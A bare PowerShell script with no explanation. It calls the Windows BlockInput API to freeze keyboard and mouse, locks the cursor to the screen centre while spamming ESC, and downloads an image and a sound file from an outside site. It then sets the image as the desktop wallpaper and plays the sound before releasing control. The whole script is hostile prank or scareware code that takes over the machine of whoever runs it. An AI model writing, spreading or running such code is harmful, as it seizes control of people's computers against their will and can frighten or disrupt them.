Add-Type -MemberDefinition @"
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool BlockInput(bool fBlockIt);
"@ -Name "InputBlocker" -Namespace "Win32"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("User32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
}
"@

$workingArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
$centerX = [int]($workingArea.X + ($workingArea.Width / 2))
$centerY = [int]($workingArea.Y + ($workingArea.Height / 2))

$loopJob = Start-Job -ScriptBlock {
    while ($true) {
        [User32]::SetCursorPos($using:centerX, $using:centerY) | Out-Null
        [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
        Start-Sleep -Milliseconds 0
    }
}

$imageUrl = "https://media.italianliferoleplay.it/media/python.png"
$audioUrl = "https://media.italianliferoleplay.it/media/python.wav"
$imagePath = "$env:TEMP\sfondo.png"
$audioPath = "$env:TEMP\e.wav"

$job1 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:imageUrl -OutFile $using:imagePath }
$job2 = Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:audioUrl -OutFile $using:audioPath }

@($job1, $job2) | ForEach-Object { Wait-Job -Job $_; Receive-Job -Job $_; Remove-Job -Job $_ }

Function Set-WallPaper {
    param (
        [parameter(Mandatory=$True)]
        [string]$Image,
        [parameter(Mandatory=$False)]
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style
    )
    $WallpaperStyle = Switch ($Style) {
        "Fill" {"10"}
        "Fit" {"6"}
        "Stretch" {"2"}
        "Tile" {"0"}
        "Center" {"0"}
        "Span" {"22"}
    }
    If($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
    }
    Else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
    }
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Params {
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int SystemParametersInfo(Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
    }
"@
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni) | Out-Null
}

Set-WallPaper -Image $imagePath -Style Fill

[Win32.InputBlocker]::BlockInput($true) | Out-Null

$audioJob = Start-Job -ScriptBlock {
    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = $using:audioPath
    $player.PlaySync()
}

$audioJob | Wait-Job

Remove-Job -Job $audioJob

$loopJob | Stop-Job
$loopJob | Remove-Job

[Win32.InputBlocker]::BlockInput($false) | Out-Null
exit
